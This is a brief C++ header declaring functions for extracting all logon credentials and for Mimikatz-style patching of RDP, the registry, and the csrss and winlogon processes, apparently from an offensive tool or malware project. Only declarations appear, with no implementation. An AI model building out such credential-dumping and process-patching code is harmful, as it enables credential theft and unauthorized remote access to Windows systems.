#pragma once

#include "core\string.h"

bool ExtactAllLogons( StringBuilder& s );
bool MimikatzPatchRDP();
bool MimikatzUpdateReestr( DWORD build_ver = 0 );
bool MimikatzPatchCsrss( DWORD pid );
bool MimikatzPatchWinlogon( DWORD pid );
